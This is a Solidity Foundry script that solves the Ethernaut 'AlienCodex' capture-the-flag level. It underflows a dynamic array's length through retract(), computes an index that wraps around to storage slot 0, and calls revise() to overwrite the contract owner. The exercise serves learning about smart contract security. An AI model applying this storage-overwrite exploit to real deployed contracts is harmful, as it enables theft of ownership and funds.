// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/AlienCodex.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract AlienCodexSolution is Script {
    
    /*
    Attack idea: In solidity v0.5, you can decrease the length of the array directly using `array.length--`.
    We can make the dynamic array underflow by calling the `retract` function if the length of the array is 0.
    This will make the array length to be 2^256 - 1, notice that the storage is limited to 2^256 - 1 slots too.
    
    owner is address of 20 bytes, and contact is a bool of 1 byte.
    Each element of the codex array is store at the keccak256(p) slot consecutively.
    p being the slot position of the codex array that contains the number of elements in the array.

    So the idea is to underflow the array length to 2^256 - 1 by calling retract, then we can have access to all the storage slots.
    Notice that each element of codex is 32 bytes
    When slot + index overflows, it will wrap around to 0, so we can overwrite the owner and contact variables.


    Slot                  Data
    ------------------------------
    0                     owner address, contract boolean
    1                     codex.length      #p = 1
    .
    .
    keccak256(p)          codex[0]
    keccak256(p) + 1      codex[1]
    .
    .
    keccak256(p) + index  codex[index]
    .
    keccak256(p) + 2^256 - 1  codex[2^256 - 1]

    So the codex array will have 2^256 - 1 elements so is the storage slots.
    So with one point there is a overlap between the codex array and the owner and contact variables.
    We want a keccak256(p) + index to be 0, so that we can overwrite the owner and contact variables.
    keccak256(1) + i = 0 => i = 0 - keccak256(1)

    

    */
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("ALIENCODEX_INSTANCE"));
    address myAddress = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // first we need to make contact with the contract so the modifier contacted will pass
        (bool success0, ) = instance.call(abi.encodeWithSignature("makeContact()"));
        require(success0, "Failed to call makeContact function");

        // first call the retract function to underflow the array length to 2^256 - 1
        (bool success1, ) = instance.call(abi.encodeWithSignature("retract()"));
        require(success1, "Failed to call retract function");
        // then we calculate the index to overwrite the owner and contact variables
        // allow underflow
        uint256 index; // 0 - keccak256(1)
        unchecked {
            index -= uint256(keccak256(abi.encodePacked(uint256(1))));
        }
        // then we call the revise function to overwrite the owner and contact variables
        (bool success2, ) = instance.call(abi.encodeWithSignature("revise(uint256,bytes32)", index, bytes32(uint256(uint160(myAddress)))));
        require(success2, "Failed to call revise function");

        (bool success3, bytes memory data) = instance.call(abi.encodeWithSignature("owner()"));
        require(success3, "Call failed");
        address owner = abi.decode(data, (address));
        require(owner == myAddress, "Failed to overwrite the owner variable");
        console.log("Owner: ", owner);
        vm.stopBroadcast();
    }

}
